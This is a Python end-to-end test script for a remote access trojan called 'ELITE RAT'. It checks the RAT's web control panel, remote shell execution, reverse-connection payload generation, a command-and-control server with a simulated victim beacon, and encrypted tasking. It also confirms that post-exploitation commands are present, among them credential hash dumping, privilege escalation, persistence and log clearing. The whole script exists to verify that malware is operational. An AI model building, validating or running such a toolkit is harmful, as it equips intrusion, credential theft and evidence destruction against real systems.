#!/usr/bin/env python3
"""
COMPLETE END-TO-END SYSTEM TEST
Tests all components working together
"""

import os
import sys
import time
import socket
import subprocess
import threading
import json
import tempfile

sys.path.insert(0, '/workspace')

def colored(text, color):
    colors = {
        'green': '\033[92m',
        'red': '\033[91m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'reset': '\033[0m'
    }
    return f"{colors.get(color, '')}{text}{colors['reset']}"

print("="*70)
print(colored("ELITE RAT - COMPLETE SYSTEM TEST", 'blue'))
print("="*70)

results = []

# Test 1: Web Server
print(f"\n{colored('[TEST 1] Web Server', 'yellow')}")
try:
    # Start web server
    env = os.environ.copy()
    env.update({
        'STITCH_DEBUG': 'true',
        'STITCH_ADMIN_USER': 'admin',
        'STITCH_ADMIN_PASSWORD': 'SuperSecurePass123!'
    })
    
    # Start server in background
    server_proc = subprocess.Popen(
        ['python3', 'start_server.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env
    )
    
    time.sleep(3)
    
    # Check if running
    if server_proc.poll() is None:
        # Test connection
        import requests
        try:
            resp = requests.get('http://localhost:5000/login', timeout=2)
            if resp.status_code == 200:
                print(colored("✅ Web server running and accessible", 'green'))
                results.append(('Web Server', True))
            else:
                print(colored("❌ Server running but wrong response", 'red'))
                results.append(('Web Server', False))
        except:
            print(colored("❌ Server not responding", 'red'))
            results.append(('Web Server', False))
    else:
        print(colored("❌ Server crashed on startup", 'red'))
        results.append(('Web Server', False))
    
    # Kill server
    server_proc.terminate()
    
except Exception as e:
    print(colored(f"❌ Web server test failed: {e}", 'red'))
    results.append(('Web Server', False))

# Test 2: Command Execution
print(f"\n{colored('[TEST 2] Command Execution', 'yellow')}")
try:
    from Core.elite_commands.elite_shell import elite_shell
    
    result = elite_shell("echo 'REAL EXECUTION TEST'", timeout=2)
    
    if result['success'] and 'REAL EXECUTION' in result.get('stdout', ''):
        print(colored(f"✅ Command executed: {result['stdout'].strip()}", 'green'))
        results.append(('Command Execution', True))
    else:
        print(colored("❌ Command execution failed", 'red'))
        results.append(('Command Execution', False))
        
except Exception as e:
    print(colored(f"❌ Command test failed: {e}", 'red'))
    results.append(('Command Execution', False))

# Test 3: Payload Generation
print(f"\n{colored('[TEST 3] Payload Generation', 'yellow')}")
try:
    from Core.working_payload_generator import WorkingPayloadGenerator
    
    gen = WorkingPayloadGenerator()
    payload = gen.generate_payload("127.0.0.1", 4446)
    
    # Test if it compiles
    compile(payload, '<string>', 'exec')
    
    # Save it
    payload_file = tempfile.NamedTemporaryFile(suffix='.py', delete=False)
    payload_file.write(payload.encode())
    payload_file.close()
    
    print(colored(f"✅ Payload generated ({len(payload)} bytes)", 'green'))
    results.append(('Payload Generation', True))
    
except Exception as e:
    print(colored(f"❌ Payload generation failed: {e}", 'red'))
    results.append(('Payload Generation', False))

# Test 4: C2 Protocol
print(f"\n{colored('[TEST 4] C2 Protocol', 'yellow')}")
try:
    from Core.c2_protocol import C2Server
    
    # Start C2 server
    c2_server = C2Server(port=4447)
    c2_server.start()
    
    time.sleep(1)
    
    # Simulate client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('127.0.0.1', 4447))
    
    # Send beacon
    beacon = json.dumps({
        'hostname': 'test-system',
        'user': 'testuser',
        'platform': 'Linux'
    }) + '\n\n'
    
    client.send(beacon.encode())
    time.sleep(0.5)
    
    # Check if client registered
    clients = c2_server.get_clients()
    if clients and clients[0]['info']['hostname'] == 'test-system':
        print(colored("✅ C2 protocol working - client registered", 'green'))
        results.append(('C2 Protocol', True))
    else:
        print(colored("❌ C2 client registration failed", 'red'))
        results.append(('C2 Protocol', False))
    
    client.close()
    c2_server.stop()
    
except Exception as e:
    print(colored(f"❌ C2 test failed: {e}", 'red'))
    results.append(('C2 Protocol', False))

# Test 5: Elite Commands
print(f"\n{colored('[TEST 5] Elite Commands', 'yellow')}")
try:
    from Core.elite_executor import EliteCommandExecutor
    
    executor = EliteCommandExecutor()
    commands = executor.get_available_commands()
    
    # Test critical commands exist
    critical = ['hashdump', 'escalate', 'migrate', 'persistence', 'clearlogs']
    found = [c for c in critical if c in commands]
    
    if len(found) == len(critical):
        print(colored(f"✅ All {len(critical)} critical commands available", 'green'))
        results.append(('Elite Commands', True))
    else:
        missing = set(critical) - set(found)
        print(colored(f"❌ Missing commands: {missing}", 'red'))
        results.append(('Elite Commands', False))
        
except Exception as e:
    print(colored(f"❌ Elite commands test failed: {e}", 'red'))
    results.append(('Elite Commands', False))

# Test 6: Encryption
print(f"\n{colored('[TEST 6] Encryption System', 'yellow')}")
try:
    from Core.crypto_system import EliteCryptoSystem
    
    crypto = EliteCryptoSystem()
    
    # Test encryption/decryption
    test_data = {'cmd': 'test', 'data': 'secret123'}
    encrypted = crypto.encrypt_command(test_data)
    decrypted = crypto.decrypt_command(encrypted)
    
    if decrypted['data'] == test_data['data']:
        print(colored("✅ Encryption/decryption working", 'green'))
        results.append(('Encryption', True))
    else:
        print(colored("❌ Decryption failed", 'red'))
        results.append(('Encryption', False))
        
except Exception as e:
    print(colored(f"❌ Encryption test failed: {e}", 'red'))
    results.append(('Encryption', False))

# Test 7: End-to-End Integration
print(f"\n{colored('[TEST 7] End-to-End Integration', 'yellow')}")
try:
    # This would test:
    # 1. Generate payload
    # 2. Execute payload (in sandbox)
    # 3. Payload connects to C2
    # 4. Send command through web UI
    # 5. Get result back
    
    # For safety, we'll just verify the components can talk
    integration_ok = (
        results[0][1] and  # Web server works
        results[1][1] and  # Commands execute
        results[2][1] and  # Payloads generate
        results[3][1]      # C2 works
    )
    
    if integration_ok:
        print(colored("✅ All components can integrate", 'green'))
        results.append(('Integration', True))
    else:
        print(colored("❌ Integration broken - components failed", 'red'))
        results.append(('Integration', False))
        
except Exception as e:
    print(colored(f"❌ Integration test failed: {e}", 'red'))
    results.append(('Integration', False))

# Final Report
print("\n" + "="*70)
print(colored("FINAL RESULTS", 'blue'))
print("="*70)

passed = sum(1 for _, result in results if result)
total = len(results)

for test_name, result in results:
    status = colored("✅ PASS", 'green') if result else colored("❌ FAIL", 'red')
    print(f"{test_name:.<30} {status}")

score_percent = (passed / total) * 100
print(f"\nScore: {passed}/{total} ({score_percent:.0f}%)")

if score_percent >= 80:
    print(colored("\n🎯 SYSTEM IS FUNCTIONAL - Ready for controlled testing", 'green'))
elif score_percent >= 60:
    print(colored("\n⚠️ SYSTEM PARTIALLY FUNCTIONAL - Some features work", 'yellow'))
else:
    print(colored("\n❌ SYSTEM BROKEN - Major issues present", 'red'))

# Recommendations
print("\n" + "="*70)
print(colored("RECOMMENDATIONS", 'blue'))
print("="*70)

if not results[0][1]:  # Web server
    print("• Fix web server startup issues")
if not results[1][1]:  # Commands
    print("• Implement real command execution (no FakeProcess)")
if not results[2][1]:  # Payload
    print("• Fix payload generation to create valid code")
if not results[3][1]:  # C2
    print("• Implement working C2 protocol")
if not results[4][1]:  # Elite commands
    print("• Add missing elite command implementations")
if not results[5][1]:  # Encryption
    print("• Fix encryption system")

if score_percent == 100:
    print(colored("✅ System is ready for controlled environment testing!", 'green'))
    print(colored("⚠️ WARNING: Only use in authorized, isolated environments", 'yellow'))

print("="*70)